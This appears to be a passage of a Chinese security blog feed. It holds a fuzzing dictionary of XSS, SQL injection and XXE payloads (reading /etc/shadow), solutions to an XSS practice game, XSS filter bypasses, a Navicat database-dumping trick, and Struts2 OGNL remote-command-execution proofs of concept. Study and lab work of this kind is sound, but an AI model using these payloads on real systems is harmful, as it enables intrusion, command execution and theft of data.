n=0;while(true)&#123;n++;&#125;&lt;/script&gt;]]&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&apos;XSS&apos;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&apos;XSS&apos;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&apos; or 1=1 or &apos;&apos;=&apos;]]&gt;&lt;/foo&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file://c:/boot.ini&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/shadow&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////dev/random&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;xml ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;&lt;xml ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;xml SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt; SQL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&apos;&quot;#---&apos;%20----&apos;;&apos;%20;=%20&apos;=%20;=%20--\x23\x27\x3D%20\x3B&apos;\x3D%20\x27\x27\x4F\x52 SELECT *\x27\x6F\x72 SELECT *&apos;or%20select *admin&apos;--&lt;&gt;&quot;&apos;%;)(&amp;+&apos;%20or%20&apos;&apos;=&apos;&apos;%20or%20&apos;x&apos;=&apos;x&quot;%20or%20&quot;x&quot;=&quot;x&apos;)%20or%20(&apos;x&apos;=&apos;x0 or 1=1&apos; or 0=0 --&quot; or 0=0 --or 0=0 --&apos; or 0=0 #&quot; or 0=0 #or 0=0 #&apos; or 1=1--&quot; or 1=1--&apos; or &apos;1&apos;=&apos;1&apos;--&quot;&apos; or 1 --&apos;&quot;or 1=1--or%201=1or%201=1 --&apos; or 1=1 or &apos;&apos;=&apos;&quot; or 1=1 or &quot;&quot;=&quot;&apos; or a=a--&quot; or &quot;a&quot;=&quot;a&apos;) or (&apos;a&apos;=&apos;a&quot;) or (&quot;a&quot;=&quot;ahi&quot; or &quot;a&quot;=&quot;ahi&quot; or 1=1 --hi&apos; or 1=1 --hi&apos; or &apos;a&apos;=&apos;ahi&apos;) or (&apos;a&apos;=&apos;ahi&quot;) or (&quot;a&quot;=&quot;a&apos;hi&apos; or &apos;x&apos;=&apos;x&apos;;@variable,@variablePRINTPRINT @@variableselectinsertasorprocedurelimitorder byascdescdeleteupdatedistincthavingtruncatereplacelikehandlerbfilename&apos; or username like &apos;%&apos; or uname like &apos;%&apos; or userid like &apos;%&apos; or uid like &apos;%&apos; or user like &apos;%exec xpexec sp&apos;; exec master..xp_cmdshell&apos;; exec xp_regreadt&apos;exec master..xp_cmdshell &apos;nslookup www.google.com&apos;----sp_password\x27UNION SELECT&apos; UNION SELECT&apos; UNION ALL SELECT&apos; or (EXISTS)&apos; (select top 1&apos;||UTL_HTTP.REQUEST1;SELECT%20*to_timestamp_tztz_offset&amp;lt;&amp;gt;&amp;quot;&apos;%;)(&amp;amp;+&apos;%20or%201=1%27%20or%201=1%20$(sleep%2050)%20&apos;sleep%2050&apos;char%4039%41%2b%40SELECT&amp;apos;%20OR&apos;sqlattempt1(sqlattempt2)|%7C*|%2A%7C*(|(mail=*))%2A%28%7C%28mail%3D%2A%29%29*(|(objectclass=*))%2A%28%7C%28objectclass%3D%2A%29%29(%28)%29&amp;%26!%21&apos; or 1=1 or &apos;&apos;=&apos;&apos; or &apos;&apos;=&apos;x&apos; or 1=1 or &apos;x&apos;=&apos;y/////**/* 写在后面基本的大概是这样子，后续会不断补充的]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
        <tag>Dict</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apk逆向分析工具 ---Apkatshu]]></title>
    <url>%2F2019%2F02%2F02%2FApkatshu%2F</url>
    <content type="text"><![CDATA[无意中发现了Apkatshu这款软件，就代码而言还是比较简单的，鉴于本人有点儿懒，就花了点儿时间深入了解了下 简介 Tool help to extract URLs, emails, up address, and juicy data from .apk files.Apkatshu : tool written in bash/python for extracting interestingdata from apk files and save them into spplited txt files .The user can choose wich decompiler to use JADX or APKTOOL Apkatshu用于提取逆向后的APK文件中的urls,emails等敏感信息 Apkatshu采用Bash与*Python编写 Apkatshu需要结合JADX或者是APKTOOL这两款APK逆向工具使用 https://github.com/0xpwny/Apkatshu JADX Command line and GUI tools for produce Java source code from Android Dex and Apk files 项目地址:https://github.com/skylot/jadx可以下载编译好的版本，也可以下载源代码，由于一直编译出错，最后我选择了编译好后的版本 使用方法:jadx 目标文件 -d 输出文件夹 APKTOOL 项目地址:https://ibotpeaches.github.io/Apktool/install/ 使用方法:APKTOOL d 目标文件 -o 输出文件夹 -p 使用由于我用的是windows,所以需要进行一些修改和配置 APKTOOL因为windows并不支持shell文件，所以需要用到Git Bash在Apkatshu.sh中通过1$(apktool d $Application -o $dist_dir -q) 调用apktool所以需要在https://ibotpeaches.github.io/Apktool/install/ 下载Linux版本，并将其放入Git Bash的/usr/bin/目录下 之后通过1./Apkatshu.sh APKTOOL 目标文件 即可 JADX在选择JADX的时候一直出错，最后先使用JADX将文件反编译，之后1python Apkatshu.py 反编译的目录 JADX 对反编译后的文件进行分析]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[想要写出来自己的东西~~]]></title>
    <url>%2F2019%2F02%2F01%2FEvil%2F</url>
    <content type="text"><![CDATA[在家无事，于是乎想自己开发一款工具，方便自己使用，顺便提高下能力吧~ X-Fuzz工具预期功能 对目标网站目录进行爆破 对目标网站参数进行爆破 对目标网站子域名进行爆破 每次爆破后更新字典，出现频率高的字段，排名靠前 使用技术 Python 主要使用Python Redis 用来储存字典 其他 可能用到的别的 目的 方便渗透测试 自我锻炼 用时 整个寒假 率先完成对目录爆破的部分 后续 尽量每天更新代码 每天还会有别的更新]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Navicat脱裤]]></title>
    <url>%2F2019%2F01%2F31%2F%E4%BD%BF%E7%94%A8navicat%E6%9D%A5%E8%84%B1%E8%A3%A4%E5%90%A7!%2F</url>
    <content type="text"><![CDATA[看到有使用Navicat脱裤的，做下记录 准备工作Navicat目录下的PHP文件 将PHP文件放在web目录打开后的效果 正式开始在本地打开Navicat，新建连接里选择http,输入目标地址在常规里主机名写localhost,在输入账号密码即可快乐的脱裤了]]></content>
      <categories>
        <category>Tips</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite 插件开发(上)]]></title>
    <url>%2F2019%2F01%2F25%2FBurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[最近一直在挖洞，经常要用到BurpSuite，而Burp 上的一下插件不太好使，就想要自己开发一些插件，在网上看了一些资料，这里来写一个简单的插件吧！ 开始前的准备开发所需要的SDK 包都可以在 Burp — Extender — APIs 处导出 由于所有接口类都有一个 package burp所以需要建一个burp包，把所有接口类导入进去，然后新建BurpExtender.java,代码都写到里面 本篇中用到的Burp APIIBurpExtender这是一个必须要实现的接口 需要实现的方法 1void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) Demo 1234567package burp;public class BurpExtender implements IBurpExtender&#123; @Override public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)&#123; // TODO here &#125;&#125; ITab此接口用于自定义的标签页 1234567891011121314//实现 ITab 接口的 getTabCaption 方法 // 此方法用于获取自定义标签的标题文本@Overridepublic String getTabCaption() &#123; // TODO Auto-generated method stub return &quot;Burp 标签测试&quot;;&#125;// 实现 ITab 接口的 getUiComponent 方法// Burp 调用此方法获取自定义标签页显示的组件@Overridepublic Component getUiComponent() &#123; // TODO Auto-generated method stub return jPanelMain;&#125; IBurpExtenderCallbacks Burp Suite 利用此接口向扩展中传递了许多回调方法，这些回调方法可被用于在 Burp 中执行多个操作。当扩展被加载后，Burp 会调用registerExtenderCallbacks() 方法，并传递一个 IBurpExtenderCallbacks 的实例。 方法有很多，具体的就看文档咯 demo 12345678package burp;public class BurpExtender implements IBurpExtender&#123; @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)&#123; // TODO Auto-generated method stub callbacks.setExtensionName("BurpExtender");//设置扩展名为“BurpExtender” &#125;&#125; IExtensionHelpers此接口提供了很多常用的辅助方法，这些扩展可用于协助处理Burp扩展所产生的各种常见任务，扩展可以通过调用IBurpExtenderCallbacks.getHelpers 获得此接口的实例。 Hello Burp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package burp;//实现的类名必须为“BurpExtender”import java.awt.Component;import java.awt.event.MouseAdapter;import java.awt.event.MouseEvent;import java.io.PrintWriter;import javax.swing.JButton;import javax.swing.JPanel;import javax.swing.SwingUtilities; // 所有的扩展必须实现IBurpExtender接口public class BurpExtender implements IBurpExtender,ITab&#123; public PrintWriter stdout; public IExtensionHelpers hps; //IExtensionHelpers提供了很多常用的辅助方法 public IBurpExtenderCallbacks cbs; public JPanel jPanelMain; //实现 ITab 接口的 getTabCaption 方法 // 此方法用于获取自定义标签的标题文本 @Override public String getTabCaption() &#123; // TODO Auto-generated method stub return "Burp 标签测试"; &#125; // 实现 ITab 接口的 getUiComponent 方法 // Burp 调用此方法获取自定义标签页显示的组件 @Override public Component getUiComponent() &#123; // TODO Auto-generated method stub return jPanelMain; &#125; //必须提供的默认构造器 //在这里写主要代码噢 @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) &#123; // TODO Auto-generated method stub callbacks.setExtensionName("BurpExtender");//设置扩展名为“BurpExtender” this.hps = callbacks.getHelpers();//IBurpExtenderCallbacks.getHelpers() 获得此接口的实例。 this.cbs = callbacks; //getStdout()此方法用于获取当前扩展的标准输出流。扩展应该将所有输出写入此流，允许Burp用户配置在UI中处理输出的方式。 this.stdout = new PrintWriter(callbacks.getStdout(), true); this.stdout.println("hello burp!");//插件被加载的时候输出 SwingUtilities.invokeLater(new Runnable() &#123; @Override public void run() &#123; // TODO Auto-generated method stub jPanelMain = new JPanel(); JButton jButton = new JButton("Hello Burp"); jButton.addMouseListener(new MouseAdapter() &#123; @Override public void mouseClicked(MouseEvent e)&#123; stdout.println("Hello Burp"); &#125; &#125;); // 将按钮添加到 主面板 jPanelMain 中. jPanelMain.add(jButton); // 设置自定义组件并添加标签 cbs.customizeUiComponent(jPanelMain); cbs.addSuiteTab(BurpExtender.this); &#125; &#125;); &#125; &#125;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[alert(1) TO WIN 第一部分]]></title>
    <url>%2F2019%2F01%2F21%2Falert(1)%20to%20win(1)%2F</url>
    <content type="text"><![CDATA[XSS好难啊~~ 简介alert(1) to win 是一个在线XSS练习平台，个人感觉挺有意思的，本篇文章记录的是1-11题 1.Warmup123function escape(s) &#123; return '&lt;script&gt;console.log("'+s+'");&lt;/script&gt;';&#125; 代码很简单，且没做过滤，那么只需要闭合掉双引号和括号即可 123");alert(1)//还有另一种方式可以减少一个字符输入");alert(1," 2.Adobe1234function escape(s) &#123; s = s.replace(/"/g, '\\"'); return '&lt;script&gt;console.log("' + s + '");&lt;/script&gt;';&#125; 这里是在第一题基础上把双引号给加上一个&quot;\&quot;转义，那么只需要再转义符号前加一个转义符号即可绕过 1\");alert(1)// 3.Json1234function escape(s) &#123; s = JSON.stringify(s); return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';&#125; 从本题以后大部分会对引号和反斜杠进行转义 这题的话可以直接把script结束掉,&lt;script&gt; 标签优先级要高于引号 1&lt;script&gt;alert(1)&lt;/script&gt; 4.JavaScript123456789function escape(s) &#123; var url = 'javascript:console.log(' + JSON.stringify(s) + ')'; console.log(url); var a = document.createElement('a'); a.href = url; document.body.appendChild(a); a.click();&#125; 本题在于URL编码，只要将&quot;编码成为%22即可通过 1%22);alert(1)// 5.MarkDown12345678function escape(s) &#123; var text = s.replace(/&lt;/g, '&amp;lt;').replace(/"/g, '&amp;quot;'); // URLs text = text.replace(/(http:\/\/\S+)/g, '&lt;a href="$1"&gt;$1&lt;/a&gt;'); // [[img123|Description]] text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt="$2" src="$1.gif"&gt;'); return text;&#125; 这一题把&lt;与&quot;都进行了HTML实体编码，同时将http:....转换为a标签，把[[a|b]]中的a转换为img标签的src而b则是alt,解开这道题的关键在于img和a标签合在一起共出现了6个双引号 所以构造 1[[a|http://onerror=alert(1)//]] 得到的结果为 1&lt;img alt="&lt;a href="http://onerror=alert(1)//" src="a.gif"&gt;"&gt;http://onerror=alert(1)//]]&lt;/a&gt; 6.DOM12345678910function escape(s) &#123; // Slightly too lazy to make two input fields. // Pass in something like "TextNode#foo" var m = s.split(/#/); // Only slightly contrived at this point. var a = document.createElement('div'); a.appendChild(document['create'+m[0]].apply(document, m.slice(1))); return a.innerHTML;&#125; 这一题的意思是将输入数据按#分割，第一份作为创建类型，第二份拼接到第一份中间,这里可以采用createComment也就是注释，来进行alert 1Comment#&gt;&lt;script&gt;alert(1)&lt;/script&gt; 7.CallBack123456789function escape(s) &#123; // Pass inn "callback#userdata" var thing = s.split(/#/); if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback'; var obj = &#123;'userdata': thing[1] &#125;; var json = JSON.stringify(obj).replace(/&lt;/g, '\\u003c'); return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";&#125; 还是用#进行分割，第一段可以出现&#39;,而且没有对&#39;进行处理 所以这里可以用 1`#`;alert(1)// 构造后的到的结果是 1&lt;script&gt;'(&#123;"userdata":"';alert(1)//"&#125;)&lt;/script&gt; 8.Skandia 123function escape(s) &#123; return '&lt;script&gt;console.log("' + s.toUpperCase() + '")&lt;/script&gt;';&#125; 此题会将所有输入的字母转换为大写，这里可以采用data伪协议或者是JsFuck进行绕过 data: 1&lt;/script&gt;&lt;script src=data:text/html,%61%6c%65%72%74(1)&gt; JsFuck: 1&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()// 9.Template 1234567891011121314151617181920212223242526function escape(s) &#123; function htmlEscape(s) &#123; return s.replace(/./g, function(x) &#123; return &#123; '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '&amp;': '&amp;amp;', '"': '&amp;quot;', "'": '&amp;#39;' &#125;[x] || x; &#125;); &#125; function expandTemplate(template, args) &#123; return template.replace( /&#123;(\w+)&#125;/g, function(_, n) &#123; return htmlEscape(args[n]); &#125;); &#125; return expandTemplate( " \n\ &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt; \n\ &lt;script&gt; \n\ var v = document.getElementById('name'); \n\ v.innerHTML = '&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;'; \n\ &lt;\/script&gt; \n\ ", &#123; name : s &#125; );&#125; 这题将&lt;&gt;&amp;&#39;&quot;全部转换为了html实体编码，不过可以通过十六进制的方法进行绕过 1\x3cimg src=@ onerror=alert(1) \x3e 其实\x3c为&lt; \x3e为&gt; 10.Json212345function escape(s) &#123; s = JSON.stringify(s).replace(/&lt;\/script/gi, ''); return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';&#125; 在一的基础上做了一个替换，把&lt;/replace&gt;替换为空，可以采用&lt;/sc&lt;/scriptript&gt;的形式绕过 1&lt;/sc&lt;/scriptript&gt;&lt;script&gt;alert(1);// 11.CallBack2123456789function escape(s) &#123; // Pass inn "callback#userdata" var thing = s.split(/#/); if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback'; var obj = &#123;'userdata': thing[1] &#125;; var json = JSON.stringify(obj).replace(/\//g, '\\/'); return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";&#125; 相较于1，这里将斜杠和反斜杠进行转义，所以无法用&lt;/script&gt;结束script,也不能用//进行注释，不过可以用&lt;!–,使JavaScript终止 1'#';alert(1)&lt;!--]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS初探]]></title>
    <url>%2F2019%2F01%2F17%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1-1%2F</url>
    <content type="text"><![CDATA[从今天开始研究XSS啦，在这里记录下学习的过程咯~~ XSS初探XSS漏洞在众多网站中出现的频率可以说是极高的了，也比SQL注入之类的漏洞容易发现。 XSS的成因 浏览器本身可以解析和执行JavaScript等 输入输出普遍存在与Web应用 大量的代码中可能出现纰漏 简单的XSS 12345678910&lt;!DOCTYPE html&gt;&lt;html lang="en" dir="ltr"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Your name is &lt;?=@$_GET[Noel]?&gt;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 只需要构造 1?Noel=&lt;script&gt;alert(1)&lt;/script&gt; 即可弹窗 XSS绕过因为大部分网站会过滤掉XSS的一些关键字，所以需要绕过 关键字被替换为空格这种情况可以用 1&lt;scr&lt;script&gt;ipt&gt; 这样的形式进行绕过 1234567891011121314151617&lt;?php function filter_xss($string)&#123; $string = preg_replace(&quot;/script/&quot;,&quot;&quot;,$string); return $string; &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Your name is &lt;?=filter_xss(@$_GET[Noel])?&gt;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 这次加了一个简单的过滤函数，Payload就是 1?Noel=&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt; 标签属性编码绕过当alert等关键词不允许出现时，可以采用ASCII编码绕过 例如alert可以编码为 1&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116 或者是 1&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74 在上一个代码基础上增改一些 123456789101112131415161718192021&lt;?php function filter_xss($string)&#123; $string = preg_replace(&quot;/onerror/&quot;,&quot;&quot;,$string); if(strpos($string,&quot;alert&quot;) === false)&#123; return $string; &#125;else&#123; echo &quot;&lt;script&gt;alert(/WARNING: XSS!/)&lt;/script&gt;&quot;; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Your name is &lt;?=filter_xss(@$_GET[Noel])?&gt;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 这时候Payload可以为 1?Noel=&lt;img%20src=@%20oneonerrorrror=&quot;%26%2397%26%23108%26%23101%26%23114%26%23116(1)&quot;/&gt; 因为浏览器中&amp;#有其他含义，所以用url编码&amp;#就是现在的Payload 绕过长度限制在有些地方，输入的长度会进行限制，如果可以反复输入，并且输出的内容在同一个页面展示，则可以把代码拆分开后进行XSS 测试代码 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php$message = @$_GET[&apos;m&apos;];$user = &quot;root&quot;;$pwd = &quot;root&quot;;$conn = new mysqli(&quot;localhost&quot;,$user,$pwd,&quot;XSS&quot;);if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error);&#125;$sqls = &quot;select * from guestbook order by id asc&quot;;$result = $conn-&gt;query($sqls);if($message != null)&#123; if(strlen($message) &gt; 15)&#123; echo &quot;&lt;script&gt;alert(&apos;长度过长&apos;);&lt;/script&gt;&quot;; exit(); &#125; $sql = &quot;insert into guestbook(message) values (&apos;&#123;$message&#125;&apos;)&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;&lt;script&gt;alert(&apos;留言成功&apos;);&lt;/script&gt;&quot;; &#125;else &#123; echo &quot;&lt;script&gt;alert(&apos;留言失败&apos;);&lt;/script&gt;&quot;; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; echo &quot;&#123;$row[&quot;id&quot;]&#125;:&#123;$row[&quot;message&quot;]&#125;&lt;hr/&gt;&quot;; &#125; &#125;?&gt; &lt;/body&gt;&lt;/html&gt; 这是个简单的留言界面，每次留言长度不能超过15，所以构造一个变量，让他不停的增加，最后eval执行 12345&lt;script&gt;/**/a=&quot;alert(&quot;;/**/a%2b=&quot;1)&quot;;/**/eval(a);/**/&lt;/script&gt; 结语这是书籍的第一章中本人觉得有用的地方，顺便简单的复习了下PHP+MySql，后续会更加深入去了解XSS。]]></content>
      <categories>
        <category>xss</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2命令执行]]></title>
    <url>%2F2018%2F12%2F27%2FStruts2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[最近一直在搞渗透，好久没写博客了的样子,一直对Struts2命令执行不太了解，这次趁着有空，搭建了环境，大部分漏洞都利用了下 S2-001原理该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行 POC获取tomcat执行路径： 1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 利用直接在页面输入的时候可以用以上POC，但是在burp里面需要进行编码 S2-003/S2-005原理S2-003漏洞发生在请求参数名，Struts2框架会对每个请求参数名解析为OGNL语句执行，因此，恶意用户可通过在参数名处注入预先设定好的OGNL语句来达到远程代码执行的攻击效果;struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开 POCS2-005(也可以用在S2-003中),直接在.action?加上去就可以了 1(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&apos;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&apos;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 没有回显 S2-007原理用户输入将被当作OGNL表达式解析，当对用户输入进行验证出现类型转换错误时。如配置了验证规则&lt;ActionName&gt;-validation.xml时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次OGNL表达式解析并返回。例如：当用户提交 age 为字符串而非整形数值时，后端用代码拼接 &quot;&#39;&quot; + value + &quot;&#39;&quot; 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。 POC1&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream())) + &apos; 利用在输入框输入POC,提交即可 S2-009原理这个漏洞再次来源于s2-003、s2-005。两者的共同点是同样是发生在ParametersInterceptor拦截器中的漏洞。只不过在S2-005漏洞中，OGNL表达式通过参数名处注入，造成远程命令执行，而S2-009漏洞的OGNL表达式通过参数值注入。 POC假设参数为name 1name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true 